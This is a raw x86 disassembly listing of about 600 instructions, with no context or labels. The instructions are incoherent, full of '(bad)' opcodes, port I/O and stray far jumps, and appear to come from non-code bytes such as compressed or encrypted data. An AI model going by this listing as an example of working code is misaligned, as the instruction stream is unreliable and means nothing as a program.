  41c1c0:	jmp    0x41c22a
  41c1c2:	in     al,dx
  41c1c3:	stc    
  41c1c4:	sub    BYTE PTR [ebp-0x61],ch
  41c1c7:	fild   WORD PTR [edx]
  41c1c9:	out    dx,al
  41c1ca:	in     al,dx
  41c1cb:	mov    eax,0x2c504879
  41c1d0:	xchg   ecx,eax
  41c1d1:	pushf  
  41c1d2:	cmp    ebx,eax
  41c1d4:	fwait
  41c1d5:	jmp    0x606c:0x2fe37685
  41c1dc:	pop    esi
  41c1dd:	in     al,dx
  41c1de:	pushf  
  41c1df:	xchg   dh,cl
  41c1e1:	sbb    eax,0x345a683f
  41c1e6:	jp     0x41c1fd
  41c1e8:	fldenv [eax+ebp*2-0x2ce0c17]
  41c1ef:	push   eax
  41c1f0:	jae    0x41c1d6
  41c1f2:	fs sbb eax,0x84c13f7e
  41c1f8:	hlt    
  41c1f9:	sbb    eax,0xb47e41e1
  41c1fe:	rcl    DWORD PTR [eax-0x77f8adeb],cl
  41c204:	bound  ecx,QWORD PTR es:[eax+0x3594d887]
  41c20b:	inc    eax
  41c20c:	and    edx,ebx
  41c20e:	sbb    ch,BYTE PTR [edi]
  41c210:	mov    al,ds:0x5f952cd
  41c215:	ss and al,0xd7
  41c218:	xchg   ebp,eax
  41c219:	mov    esp,0x70641c21
  41c21e:	std    
  41c21f:	add    al,0x50
  41c221:	les    esi,FWORD PTR [esi-0x25]
  41c224:	push   edi
  41c225:	div    DWORD PTR [edi-0x16d661e0]
  41c22b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c22c:	or     eax,0x62f883c2
  41c231:	shl    al,0x62
  41c234:	call   0xe81:0x261e5b15
  41c23b:	pop    ebx
  41c23c:	inc    ecx
  41c23d:	sbb    ecx,DWORD PTR [esi+0x1082dc03]
  41c243:	xor    eax,0xe9dc0642
  41c248:	pop    ss
  41c249:	jno    0x41c2c0
  41c24b:	sub    cl,BYTE PTR [eax+0x4b]
  41c24e:	sub    DWORD PTR [ecx+edi*2],ebp
  41c251:	mov    ds:0xc3e38914,eax
  41c256:	in     al,dx
  41c257:	or     eax,DWORD PTR [ecx-0x2ca730c8]
  41c25d:	dec    ecx
  41c25e:	pop    eax
  41c25f:	push   cs
  41c260:	nop
  41c261:	ficom  WORD PTR [ecx+0x4e]
  41c264:	cwde   
  41c265:	fcomp  DWORD PTR [edi+0x87701b3]
  41c26b:	and    dl,bl
  41c26d:	pop    esp
  41c26e:	jbe    0x41c264
  41c270:	aas    
  41c271:	(bad)
  41c275:	push   0xffffffa0
  41c277:	push   ds
  41c278:	fcomp  QWORD PTR [ecx]
  41c27a:	and    ebp,DWORD PTR [ecx]
  41c27c:	sub    BYTE PTR [ebx+ecx*2-0x7cf4c51d],0x7a
  41c284:	lahf   
  41c285:	arpl   WORD PTR [esi+esi*1+0x11f54085],sp
  41c28c:	mov    eax,DWORD PTR [eax-0x41be3fee]
  41c292:	mov    ecx,0x17c31d84
  41c297:	and    al,0xe8
  41c299:	sbb    esp,DWORD PTR [esi+esi*1+0x67a2ceb7]
  41c2a0:	sti    
  41c2a1:	ret    0xbee9
  41c2a4:	xor    edx,esi
  41c2a6:	scas   eax,DWORD PTR es:[edi]
  41c2a7:	and    esi,edx
  41c2a9:	jno    0x41c235
  41c2ab:	std    
  41c2ac:	pop    esp
  41c2ad:	das    
  41c2ae:	xor    al,0x13
  41c2b0:	std    
  41c2b1:	stos   BYTE PTR es:[edi],al
  41c2b2:	xchg   esp,eax
  41c2b3:	push   esi
  41c2b4:	push   0x12fbbe2c
  41c2b9:	push   edx
  41c2ba:	dec    edi
  41c2bb:	dec    ebp
  41c2bc:	fnstenv [ecx+0x1e]
  41c2bf:	push   ss
  41c2c0:	stos   DWORD PTR es:[edi],eax
  41c2c1:	mov    eax,0x7e931af3
  41c2c6:	pop    eax
  41c2c7:	or     ebx,DWORD PTR [ebx]
  41c2c9:	or     al,0xd2
  41c2cb:	ins    BYTE PTR es:[edi],dx
  41c2cc:	and    esi,ecx
  41c2ce:	add    BYTE PTR [ecx],ah
  41c2d0:	shl    BYTE PTR [esi+0x61793fef],0x46
  41c2d7:	lods   eax,DWORD PTR ds:[esi]
  41c2d8:	pop    edx
  41c2d9:	jle    0x41c333
  41c2db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2dc:	push   ss
  41c2dd:	ds dec ebp
  41c2df:	daa    
  41c2e0:	xchg   edi,eax
  41c2e1:	adc    ebp,DWORD PTR [ecx+0x14488f9c]
  41c2e7:	mov    cl,0x7e
  41c2e9:	cmp    eax,DWORD PTR [edx+0x3a]
  41c2ec:	adc    eax,0xf384af1f
  41c2f1:	pushf  
  41c2f2:	shr    ch,0xa6
  41c2f5:	lock cwde 
  41c2f7:	or     eax,0x3f4e5d88
  41c2fc:	ds daa 
  41c2fe:	loopne 0x41c33f
  41c300:	pusha  
  41c301:	mov    cl,0x9f
  41c303:	xor    bl,BYTE PTR [esi]
  41c305:	rcl    DWORD PTR [esi],1
  41c307:	sbb    dl,BYTE PTR [esi-0x7c3d104d]
  41c30d:	ret    
  41c30e:	push   ds
  41c30f:	push   0xf2061a80
  41c314:	sub    ebx,esp
  41c316:	add    DWORD PTR [ebp-0x455a229e],ebp
  41c31c:	jecxz  0x41c2a0
  41c31e:	shl    dh,cl
  41c320:	pop    esi
  41c321:	xor    bl,BYTE PTR ds:0xf71613fb
  41c327:	ret    0x1117
  41c32a:	int    0xc3
  41c32c:	mov    al,0xa2
  41c32e:	dec    esp
  41c32f:	mov    bh,0x8c
  41c331:	lock adc edi,DWORD PTR [esi+eax*1]
  41c335:	or     dl,BYTE PTR [ecx]
  41c337:	ins    WORD PTR es:[edi],dx
  41c339:	fiadd  DWORD PTR [edx+0x2]
  41c33c:	sbb    dh,BYTE PTR [ecx+0x504e9fdf]
  41c342:	inc    eax
  41c343:	inc    ebp
  41c344:	xor    DWORD PTR [eax+0x14],esp
  41c347:	jae    0x41c354
  41c349:	xchg   esi,eax
  41c34a:	mov    fs,WORD PTR [esi+edi*8]
  41c34d:	(bad)  
  41c34e:	sub    eax,0x3dd3954f
  41c353:	clc    
  41c354:	sub    al,0x85
  41c356:	sbb    BYTE PTR [ecx+0x53],ah
  41c359:	mov    edi,0x8b0b4ddd
  41c35e:	outs   dx,DWORD PTR ds:[esi]
  41c35f:	add    BYTE PTR [ebp-0x45],0x96
  41c363:	xor    eax,0x3bfc3068
  41c368:	cmp    ch,dh
  41c36a:	or     BYTE PTR [ecx+eiz*4+0x50349da9],ah
  41c371:	stc    
  41c372:	sub    BYTE PTR [edi],0xca
  41c375:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c376:	inc    ecx
  41c377:	cld    
  41c378:	sub    eax,0xf2165a7
  41c37d:	gs std 
  41c37f:	dec    esp
  41c380:	mov    ecx,fs
  41c382:	loopne 0x41c3e3
  41c384:	and    ebp,0x35
  41c387:	dec    ebx
  41c388:	fscale 
  41c38a:	xchg   ebp,eax
  41c38b:	pop    eax
  41c38c:	lods   eax,DWORD PTR ds:[esi]
  41c38d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c38e:	sub    al,0x4d
  41c390:	xchg   ecx,eax
  41c391:	cwde   
  41c392:	outs   dx,DWORD PTR ds:[esi]
  41c393:	lods   al,BYTE PTR ds:[esi]
  41c394:	dec    ebp
  41c395:	xor    al,0x58
  41c397:	add    eax,0xb9e431a6
  41c39c:	adc    BYTE PTR [ecx-0x71],dl
  41c39f:	dec    edx
  41c3a0:	jnp    0x41c3f1
  41c3a2:	jb     0x41c390
  41c3a4:	xchg   dl,ah
  41c3a6:	lods   al,BYTE PTR ds:[esi]
  41c3a7:	pop    ebp
  41c3a8:	inc    edi
  41c3a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3aa:	popa   
  41c3ab:	and    eax,DWORD PTR [esi-0x63b5be9d]
  41c3b1:	jo     0x41c396
  41c3b3:	push   ss
  41c3b4:	adc    ch,BYTE PTR [esi+0x33c98d1]
  41c3ba:	and    BYTE PTR [ebx+0x4],ch
  41c3bd:	xchg   edi,eax
  41c3be:	pop    ss
  41c3bf:	jg     0x41c42e
  41c3c1:	xlat   BYTE PTR ds:[ebx]
  41c3c2:	sbb    al,0x8
  41c3c4:	aad    0xe6
  41c3c6:	imul   edi,DWORD PTR [ebp-0x2f],0x3d16ffaf
  41c3cd:	daa    
  41c3ce:	loope  0x41c418
  41c3d0:	lods   eax,DWORD PTR ds:[esi]
  41c3d1:	dec    ecx
  41c3d2:	nop
  41c3d3:	inc    esp
  41c3d4:	cmp    DWORD PTR [ebx+0x3d071c10],edi
  41c3da:	sub    DWORD PTR [ecx-0x57],0xb36290f
  41c3e1:	push   cs
  41c3e2:	test   DWORD PTR [esi],esp
  41c3e4:	jns    0x41c417
  41c3e6:	aas    
  41c3e7:	call   0xaf38f42f
  41c3ec:	ret    
  41c3ed:	out    dx,al
  41c3ee:	and    ecx,DWORD PTR [ebp-0x23]
  41c3f1:	cld    
  41c3f2:	arpl   WORD PTR [eax],cx
  41c3f4:	jg     0x41c45e
  41c3f6:	mov    ecx,0x69e3f834
  41c3fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3fc:	icebp  
  41c3fd:	call   0xe470:0x7ced0435
  41c404:	mov    es,WORD PTR [ebx+0x4f]
  41c407:	jae    0x41c477
  41c409:	mov    ah,0xdc
  41c40b:	adc    esi,ecx
  41c40d:	mov    ds:0x5e6eb832,eax
  41c412:	mov    bl,0x94
  41c414:	out    dx,al
  41c415:	jge    0x41c39b
  41c417:	push   0x57
  41c419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c41a:	retf   
  41c41b:	imul   esi,DWORD PTR [eax+0x4c],0xffffffa4
  41c41f:	shl    edi,0x5e
  41c422:	sbb    ebp,DWORD PTR ds:0xd339f86
  41c428:	ins    DWORD PTR es:[edi],dx
  41c429:	push   esi
  41c42a:	xchg   ebp,eax
  41c42b:	aam    0x2a
  41c42d:	mov    ch,0x7e
  41c42f:	icebp  
  41c430:	dec    edi
  41c431:	mov    eax,0xf560f4f0
  41c436:	sbb    al,0x93
  41c438:	sub    eax,0x22a8c0e0
  41c43d:	jb     0x41c3d4
  41c43f:	push   esi
  41c440:	jmp    0xa8cd7108
  41c445:	xchg   ebp,eax
  41c446:	xlat   BYTE PTR ds:[ebx]
  41c447:	xchg   ebp,eax
  41c448:	xchg   ecx,eax
  41c449:	cmp    eax,DWORD PTR [edi-0x61]
  41c44c:	sahf   
  41c44d:	stos   BYTE PTR es:[edi],al
  41c44e:	rcr    BYTE PTR [edx-0x441de73d],cl
  41c454:	lahf   
  41c455:	xor    BYTE PTR [edx-0xd9f1e40],0xf9
  41c45c:	rcl    DWORD PTR [ebx],1
  41c45e:	jno    0x41c3ef
  41c460:	or     eax,DWORD PTR [ebp+0x21]
  41c463:	xor    BYTE PTR [ecx+0x1b2c2913],0xeb
  41c46a:	mov    ebp,DWORD PTR [ecx-0x76]
  41c46d:	rol    BYTE PTR [edi],1
  41c46f:	rcl    BYTE PTR [edi+0x7e],1
  41c472:	fimul  DWORD PTR [ebx+0x1f2cf28]
  41c478:	adc    ebp,ebp
  41c47a:	cmp    ebx,DWORD PTR cs:[edx+0x64]
  41c47e:	pop    esi
  41c47f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c480:	sub    esi,DWORD PTR [esi+eiz*4]
  41c483:	inc    esi
  41c484:	out    0x29,eax
  41c486:	imul   eax,DWORD PTR [edx+0x1bec9d2a],0x5e86a2fe
  41c490:	out    dx,al
  41c491:	mov    WORD PTR [ebx-0x70640040],?
  41c497:	adc    eax,ebp
  41c499:	addr16 leave 
  41c49b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c49c:	lock ficom DWORD PTR [ebx-0x3a]
  41c4a0:	mov    eax,ds:0x2829266c
  41c4a5:	in     al,0x27
  41c4a7:	mov    ebx,0xe65156e1
  41c4ac:	(bad)  
  41c4ad:	mov    ebp,0x4771bfa4
  41c4b2:	aas    
  41c4b3:	sar    DWORD PTR [ecx-0x18],0x46
  41c4b7:	(bad)  
  41c4b8:	xlat   BYTE PTR ds:[ebx]
  41c4b9:	out    0xc1,al
  41c4bb:	imul   edx,DWORD PTR [esi+eiz*1-0x74],0x0
  41c4c0:	mov    ch,0x3d
  41c4c2:	jne    0x41c4a3
  41c4c4:	xchg   esp,eax
  41c4c5:	(bad)  
  41c4c6:	mov    esi,DWORD PTR [edx]
  41c4c8:	out    dx,al
  41c4c9:	daa    
  41c4ca:	jb     0x41c494
  41c4cc:	mov    esp,0xfd02c910
  41c4d1:	imul   esi,DWORD PTR [edx+0x1f],0x28
  41c4d5:	scas   eax,DWORD PTR es:[edi]
  41c4d6:	adc    BYTE PTR [eax+0x25be81dd],ah
  41c4dc:	dec    DWORD PTR [esi+0x2d]
  41c4df:	jno    0x503d4648
  41c4e5:	inc    ecx
  41c4e6:	mov    edx,0x3066c2cd
  41c4eb:	scas   al,BYTE PTR es:[edi]
  41c4ec:	mov    cl,0x7c
  41c4ee:	rcr    BYTE PTR [ecx+0x5c199811],1
  41c4f4:	dec    edx
  41c4f5:	test   eax,0x790466ea
  41c4fa:	jge    0x41c52d
  41c4fc:	(bad)  
  41c4fd:	adc    dl,BYTE PTR [ebp-0x45]
  41c500:	fcmovb st,st(0)
  41c502:	jge    0x41c51e
  41c504:	xor    DWORD PTR [ebp+0x337c8e95],0x1be8960f
  41c50e:	adc    ch,BYTE PTR [edi-0x65]
  41c511:	dec    edi
  41c512:	inc    eax
  41c513:	dec    esp
  41c514:	test   al,0xd0
  41c517:	jb     0x41c523
  41c519:	data16 shl dh,0xa8
  41c51d:	sub    al,0x1a
  41c51f:	pop    edi
  41c520:	int3   
  41c521:	dec    esi
  41c522:	mov    eax,0xa4a36d4b
  41c527:	ins    DWORD PTR es:[edi],dx
  41c528:	imul   ebx,DWORD PTR [edi-0x211a24a0],0xb858f0f0
  41c532:	(bad)  
  41c534:	and    BYTE PTR [ebx+0x3d5cc5f],0xc4
  41c53b:	shl    BYTE PTR [ecx+0x6a],1
  41c53e:	sbb    DWORD PTR [esi+0x2276e75d],ecx
  41c544:	ins    BYTE PTR es:[edi],dx
  41c545:	push   ebx
  41c546:	scas   al,BYTE PTR es:[edi]
  41c547:	mov    al,ds:0xcb7287be
  41c54c:	dec    ebp
  41c54d:	inc    ebx
  41c54e:	and    al,bh
  41c550:	inc    edx
  41c551:	pop    esp
  41c552:	add    DWORD PTR [ebx-0xf4a2362],edx
  41c558:	cld    
  41c559:	sbb    bh,BYTE PTR [eax+0x7f]
  41c55c:	mov    dl,0x4d
  41c55e:	in     al,0xc8
  41c560:	in     eax,0xbe
  41c562:	dec    ecx
  41c563:	or     al,0x29
  41c565:	and    bh,BYTE PTR [eax+edx*8]
  41c568:	or     al,0x92
  41c56a:	and    BYTE PTR ds:0xe81ec131,cl
  41c570:	hlt    
  41c571:	lea    ecx,[ebp+0x104a145e]
  41c577:	dec    esp
  41c578:	lods   eax,DWORD PTR ds:[esi]
  41c579:	cmp    dl,BYTE PTR [eax-0x4ef748ff]
  41c57f:	mov    ebp,0x6ac1b317
  41c584:	(bad)  
  41c585:	repnz sub al,0x56
  41c588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c589:	enter  0x982a,0x59
  41c58d:	call   0x2225f951
  41c592:	iret   
  41c593:	ja     0x41c51e
  41c595:	dec    edi
  41c596:	pop    ds
  41c597:	fbld   TBYTE PTR [ebx-0x3e]
  41c59a:	mov    bh,BYTE PTR [ebx+eiz*1+0x0]
  41c59e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c59f:	js     0x41c5aa
  41c5a1:	and    eax,0x6947fed2
  41c5a6:	push   0x1655ddc4
  41c5ab:	dec    esp
  41c5ac:	out    0x74,eax
  41c5ae:	push   cs
  41c5af:	push   edx
  41c5b0:	xchg   esi,eax
  41c5b1:	xlat   BYTE PTR ds:[ebx]
  41c5b2:	mov    al,ds:0xa8767d03
  41c5b7:	push   edx
  41c5b8:	or     DWORD PTR [ebx+esi*2+0x73],edi
  41c5bc:	mov    dl,0xab
  41c5be:	retf   
  41c5bf:	mov    ds:0x9c2d7edc,al
  41c5c4:	mov    BYTE PTR [eax-0x4b82102f],cl
  41c5ca:	lock std 
  41c5cc:	pusha  
  41c5cd:	hlt    
  41c5ce:	add    eax,0x85322013
  41c5d3:	mov    ah,0xed
  41c5d5:	adc    bl,BYTE PTR [esi]
  41c5d7:	in     eax,dx
  41c5d8:	into   
  41c5d9:	mov    eax,ds:0x636ced3
  41c5de:	loop   0x41c652
  41c5e0:	in     eax,dx
  41c5e1:	push   edi
  41c5e2:	dec    DWORD PTR [ebp+0x24fd1e0f]
  41c5e8:	les    eax,FWORD PTR [esi+ecx*8]
  41c5eb:	and    eax,0xa50a5828
  41c5f0:	jmp    0x2a1a7809
  41c5f5:	cmp    al,0xd6
  41c5f7:	idiv   al
  41c5f9:	jmp    0x41c588
  41c5fb:	push   ds
  41c5fc:	stos   DWORD PTR es:[edi],eax
  41c5fd:	mov    cl,0xa3
  41c5ff:	xchg   esp,eax
  41c600:	adc    ebx,0xfb284076
  41c606:	(bad)  
  41c607:	out    0xa3,al
  41c609:	popf   
  41c60a:	iret   
  41c60b:	sub    edx,DWORD PTR [ebx]
  41c60d:	rcl    DWORD PTR [edi-0x7ec9e3a9],0x5f
  41c614:	mov    bl,0x21
  41c616:	mov    ds:0xe88d50c7,eax
  41c61b:	mov    dh,0x33
  41c61d:	arpl   WORD PTR [eax],cx
  41c61f:	daa    
  41c620:	clc    
  41c621:	xchg   ebp,eax
  41c622:	arpl   bp,dx
  41c624:	test   eax,0xcbec72cf
  41c629:	mov    al,0x1a
  41c62b:	mov    DWORD PTR [ebx+eiz*4+0x5e4229d9],esi
  41c632:	xor    esp,DWORD PTR [ebx]
  41c634:	jl     0x41c631
  41c636:	rcr    dl,0xda
  41c639:	(bad)  
  41c63a:	das    
  41c63b:	pop    eax
  41c63c:	jo     0x41c638
  41c63e:	dec    edi
  41c63f:	dec    ebp
  41c640:	(bad)  
  41c641:	shl    bl,1
  41c643:	in     eax,dx
  41c644:	retf   0x11ab
  41c647:	jns    0x41c5df
  41c649:	jp     0x41c67a
  41c64b:	lea    ecx,[edx]
  41c64d:	sub    edi,DWORD PTR [ebp-0x5db9d67d]
  41c653:	mov    ecx,0xd9011207
  41c658:	int3   
  41c659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c65a:	and    ebx,DWORD PTR [eax]
  41c65c:	adc    bh,al
  41c65e:	aad    0x20
  41c660:	pop    ds
  41c661:	ds lahf 
  41c663:	rcr    DWORD PTR [ebx-0x40be42ad],cl
  41c669:	aas    
  41c66a:	mov    bh,0xd6
  41c66d:	fcomi  st,st(2)
  41c66f:	pop    edi
  41c670:	mov    eax,ds:0x20436af5
  41c675:	das    
  41c676:	test   DWORD PTR [ebp-0x26937762],ecx
  41c67c:	pusha  
  41c67d:	and    cx,WORD PTR [esi-0x20]
  41c681:	adc    al,dl
  41c683:	add    BYTE PTR [ebp-0x6a5a2428],dl
  41c689:	mov    eax,ds:0x3bd8b7ea
  41c68e:	mov    al,BYTE PTR [esi+0x3a6309e5]
  41c694:	call   0xba15f1d
  41c699:	cmp    BYTE PTR [edx],dl
  41c69b:	lds    esi,FWORD PTR [ebx-0x3d]
  41c69e:	pop    ebx
  41c69f:	add    DWORD PTR [eax+0x78b58c1b],0x74
  41c6a6:	and    DWORD PTR [edi-0x5a6d3469],esi
  41c6ac:	add    DWORD PTR [eax],esp
  41c6ae:	mul    DWORD PTR [ecx+0x58]
  41c6b1:	not    bh
  41c6b3:	push   ebp
  41c6b4:	jmp    0xe7cc:0x5531aa0f
  41c6bb:	frstor [ecx+0x6c]
  41c6be:	dec    ebx
  41c6bf:	add    eax,0xa9cd5aac
  41c6c4:	cmc    
  41c6c5:	xchg   DWORD PTR [eax+0x13ab1249],esi
  41c6cb:	cmc    
  41c6cc:	adc    ebx,edx
  41c6ce:	adc    eax,0xcd812369
  41c6d3:	cmc    
  41c6d4:	mov    cl,ah
  41c6d6:	add    al,0xe2
  41c6d8:	cld    
  41c6d9:	push   0x122946d2
  41c6de:	scas   al,BYTE PTR es:[edi]
  41c6df:	pop    ecx
  41c6e0:	retf   
  41c6e1:	outs   dx,DWORD PTR ss:[esi]
  41c6e3:	adc    dl,ch
  41c6e5:	push   esp
  41c6e6:	cs xchg ebx,eax
  41c6e8:	pop    esp
  41c6e9:	pop    es
  41c6ea:	xor    eax,0x237f3df
  41c6ef:	jle    0x41c75c
  41c6f1:	jo     0x41c730
  41c6f3:	outs   dx,DWORD PTR ds:[esi]
  41c6f4:	jmp    0x41c738
  41c6f6:	and    BYTE PTR [eax+0x1488e257],ah
  41c6fc:	lea    esi,[ebx+esi*4-0x5e]
  41c700:	add    eax,ecx
  41c702:	pop    edi
  41c703:	pop    esi
  41c704:	push   ebx
  41c705:	mov    edx,fs
  41c707:	dec    esp
  41c708:	dec    esi
  41c709:	movs   BYTE PTR es:[di],BYTE PTR es:[si]
  41c70c:	aad    0xcf
  41c70e:	mov    al,0x38
  41c710:	sahf   
  41c711:	mov    eax,ds:0xabf4d91f
  41c716:	test   DWORD PTR [edx+0x2b420409],0x7e4e4050
  41c720:	xchg   esi,eax
  41c721:	xlat   BYTE PTR ds:[ebx]
  41c722:	add    al,0xeb
  41c724:	cmp    ebp,edi
  41c726:	adc    esp,DWORD PTR [ecx+0x30]
  41c729:	test   eax,0x7d8572d8
  41c72e:	ds std 
  41c730:	mov    ah,BYTE PTR [ecx+0x79]
  41c733:	enter  0x72ba,0x3
  41c737:	in     al,0x86
  41c739:	in     eax,dx
  41c73a:	stos   DWORD PTR es:[edi],eax
  41c73b:	repz xchg bl,bl
  41c73e:	push   ecx
  41c73f:	iret   
  41c740:	ss std 
  41c742:	mov    edx,0x66d1debd
  41c747:	scas   eax,DWORD PTR es:[edi]
  41c748:	out    0xdb,eax
  41c74a:	mov    ds,WORD PTR [eax-0x26]
  41c74d:	add    DWORD PTR [edi-0x6a2e3644],edi
  41c753:	push   ebx
  41c754:	imul   ebx,DWORD PTR [eax-0x55],0xffffffc1
  41c758:	mov    dh,0x64
  41c75a:	add    edi,DWORD PTR [ecx]
  41c75c:	xchg   edx,eax
  41c75d:	xor    DWORD PTR [ecx],edi
  41c75f:	outs   dx,DWORD PTR ds:[esi]
  41c760:	or     eax,0x34de0b86
  41c765:	xchg   esp,eax
  41c766:	loope  0x41c7d1
  41c768:	pusha  
  41c769:	push   0x703b11bd
  41c76e:	pop    es
  41c76f:	out    dx,al
  41c770:	adc    bh,bh
  41c772:	and    al,0x2a
  41c774:	addr16 enter 0x8cb5,0xee
  41c779:	inc    ebp
  41c77a:	(bad)  
  41c77c:	pop    ss
  41c77d:	sbb    eax,0xf365dab4
  41c782:	mov    ds:0xa5d07835,eax
  41c787:	inc    BYTE PTR [eax+0x63]
  41c78a:	stos   BYTE PTR es:[edi],al
  41c78b:	or     eax,0xb83861ee
  41c790:	aas    
  41c791:	mov    cl,0x43
  41c793:	pop    edx
  41c794:	and    bh,BYTE PTR [edx]
  41c796:	push   0x6d
  41c798:	mov    ah,0xb2
  41c79a:	sbb    ebx,DWORD PTR [esi]
  41c79c:	aaa    
  41c79d:	add    BYTE PTR [edx-0x63f7ed1a],bh
  41c7a3:	xchg   ecx,eax
  41c7a4:	mov    bh,0x5e
  41c7a6:	lock push cs
  41c7a8:	ins    DWORD PTR es:[edi],dx
  41c7a9:	cmc    
  41c7aa:	adc    BYTE PTR [edx*2-0x31453cba],cl
  41c7b1:	out    dx,al
  41c7b2:	sub    DWORD PTR [ebx+eiz*1],ecx
  41c7b5:	xor    al,0x49
  41c7b7:	mov    ds:0xdb6f4849,eax
  41c7bc:	fwait
  41c7bd:	and    bl,BYTE PTR [edi-0x648ecaf3]
  41c7c3:	stos   DWORD PTR es:[edi],eax
  41c7c4:	jge    0x41c7c8
  41c7c6:	mov    al,0xaa
  41c7c8:	nop
  41c7c9:	sub    bh,ah
  41c7cb:	jge    0x41c7f3
  41c7cd:	xor    BYTE PTR [edi],dh
  41c7cf:	or     al,0x8e
  41c7d1:	inc    eax
  41c7d2:	ja     0x41c840
  41c7d4:	scas   al,BYTE PTR es:[edi]
  41c7d5:	out    0x9e,al
  41c7d7:	mov    ax,ds:0x81f0c600
  41c7dd:	scas   al,BYTE PTR es:[edi]
  41c7de:	sbb    bl,BYTE PTR [edi+0x1b9a6128]
  41c7e4:	jne    0x41c79c
  41c7e6:	frstor [ecx]
  41c7e8:	aaa    
  41c7e9:	jne    0x41c799
  41c7eb:	inc    edi
  41c7ec:	fisubr WORD PTR [edi]
  41c7ee:	xchg   ecx,eax
  41c7ef:	outs   dx,BYTE PTR ds:[esi]
  41c7f0:	sti    
  41c7f1:	jmp    0x4430:0xa2dcd16b
  41c7f8:	sbb    eax,0x556509bd
  41c7fd:	scas   al,BYTE PTR es:[edi]
  41c7fe:	repnz sub eax,0xb122f523
  41c804:	retf   
  41c805:	xor    eax,0xec7c3457
  41c80a:	nop    DWORD PTR [esi-0x1b]
  41c80e:	mov    ecx,0xb25f3ecf
  41c813:	dec    eax
  41c814:	push   es
  41c815:	fmulp  st(4),st
  41c817:	add    DWORD PTR [edx+0x5],ebx
  41c81a:	pop    esp
  41c81b:	std    
  41c81c:	cmove  ecx,DWORD PTR [ebx]
  41c81f:	fild   WORD PTR [esi]
  41c821:	push   ebx
  41c822:	je     0x41c7a6
  41c824:	aad    0x9
  41c826:	cdq    
  41c827:	add    eax,0xb6024288
  41c82c:	int3   
  41c82d:	mov    dl,0xe0
  41c82f:	or     dl,BYTE PTR [eax-0x2337cec8]
  41c835:	push   es
  41c836:	push   ecx
  41c837:	imul   ebp,DWORD PTR [ebp+0x5a],0x4810892f
  41c83e:	in     al,dx
  41c83f:	jbe    0x41c87a
  41c841:	mov    BYTE PTR [edi+0x83c5619],dl
  41c847:	or     DWORD PTR [edx],eax
  41c849:	stos   BYTE PTR es:[edi],al
  41c84a:	loop   0x41c82a
  41c84c:	popf   
  41c84d:	repnz sahf 
  41c84f:	add    eax,0x1573696b
  41c854:	sub    bl,BYTE PTR [ebp+0x1e042a4e]
  41c85a:	and    al,0x33
  41c85c:	lahf   
  41c85d:	ins    DWORD PTR es:[edi],dx
  41c85e:	cmc    
  41c85f:	sbb    ax,0x5937
  41c863:	pop    ss
  41c864:	pop    es
  41c865:	fwait
  41c866:	cmp    esi,DWORD PTR [edx]
  41c868:	fs jmp 0xe1850f9c
  41c86e:	or     DWORD PTR [edx+0x277654c7],ebx
  41c874:	test   al,0x8b
  41c876:	lock sbb al,0xf8
  41c879:	cmp    BYTE PTR [eax+0x64e39d4b],al
  41c87f:	out    dx,eax
  41c880:	popa   
  41c881:	sub    edx,DWORD PTR [eax]
  41c883:	repz add eax,0x65394f72
  41c889:	dec    ecx
  41c88a:	test   DWORD PTR [edx],edi
  41c88c:	std    
  41c88d:	cmp    al,0x44
  41c88f:	dec    esp
  41c890:	xchg   esi,eax
  41c891:	jnp    0x41c83a
  41c893:	aas    
  41c894:	push   cs
  41c895:	xor    al,BYTE PTR [edi+0x19]
  41c898:	fild   DWORD PTR [edi]
  41c89a:	push   esi
  41c89b:	dec    esi
  41c89c:	or     al,0x7a
  41c89e:	xchg   edx,eax
  41c89f:	mov    DWORD PTR [ebp+0xf6990e9],ecx
  41c8a5:	adc    BYTE PTR [edx+0x3fcc8ca1],bh
  41c8ab:	dec    ecx
  41c8ac:	retf   0xa8cd
  41c8af:	out    0xab,eax
  41c8b1:	pop    edx
  41c8b2:	mov    edi,0x3e6693bf
  41c8b7:	jp     0x41c901
  41c8b9:	out    0xd2,al
  41c8bb:	popa   
  41c8bc:	imul   esi,DWORD PTR [esi],0xffffffab
  41c8bf:	cmc    
  41c8c0:	sti    
  41c8c1:	mov    dl,al
  41c8c3:	sbb    bh,cl
  41c8c5:	js     0x41c847
  41c8c7:	dec    edx
  41c8c8:	xchg   ebx,eax
  41c8c9:	imul   ecx,esp,0xffffffce
  41c8cc:	adc    eax,0x93dd22ca
  41c8d1:	sub    al,0x57
  41c8d3:	(bad)  
  41c8d4:	stc    
  41c8d5:	xor    cl,cl
  41c8d7:	lea    ebx,[edx+edx*8]
  41c8da:	inc    DWORD PTR [esi-0x5e]
  41c8dd:	call   0xdc84ce99
  41c8e2:	fild   QWORD PTR [ecx+0xc]
  41c8e5:	jnp    0x41c87d
  41c8e7:	adc    al,0x4d
  41c8e9:	sahf   
  41c8ea:	or     DWORD PTR [eax-0x4f8fce47],esi
  41c8f0:	xchg   ebp,eax
  41c8f1:	aam    0x50
  41c8f3:	leave  
  41c8f4:	call   0x48dffc7
  41c8f9:	add    dl,BYTE PTR [edi+esi*2+0x7]
  41c8fd:	js     0x41c966
  41c8ff:	jae    0x41c91e
  41c901:	out    dx,eax
  41c902:	push   esi
  41c903:	fcomp  DWORD PTR [ecx-0x2e]
  41c906:	sub    BYTE PTR [esi+0x3c],ch
  41c909:	pop    ebp
  41c90a:	cmp    dh,BYTE PTR [eax-0x4e]
  41c90d:	mov    ecx,?
  41c90f:	out    dx,eax
  41c910:	pop    edx
  41c911:	mov    dh,0x6b
  41c913:	stos   DWORD PTR es:[edi],eax
  41c914:	jg     0x41c91b
  41c916:	adc    esi,DWORD PTR [ecx-0x1f]
  41c919:	aaa    
  41c91a:	mov    dh,0x3c
  41c91c:	xor    ch,BYTE PTR [edi]
  41c91e:	or     ecx,DWORD PTR [ebp-0x1447f61d]
  41c924:	in     al,0xc5
